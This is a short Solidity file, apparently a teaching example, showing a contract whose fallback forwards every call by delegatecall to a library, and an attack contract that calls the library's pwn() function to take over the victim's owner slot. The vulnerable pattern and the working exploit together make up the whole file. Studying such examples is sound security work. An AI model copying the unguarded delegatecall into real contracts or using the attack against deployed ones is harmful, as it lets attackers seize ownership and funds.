pragma solidity ^0.6.10;

contract HackMe1 {
	address public owner;
	address public lib;

	constructor(address _lib) public {
		owner = msg.sender;
		lib = _lib;
	}

	fallback() external payable {
		lib.delegatecall(msg.data);
	}
}

contract HackMeLib1 {
	address public owner;

	function pwn() public {
		owner = msg.sender;
	}
}

contract DelegateCallAttack1 {
	address public hackMe;

	constructor(address _hackMe) public {
		hackMe = _hackMe;
	}

	function attack() public {
		hackMe.call(abi.encodeWithSignature("pwn()"));
	}
}
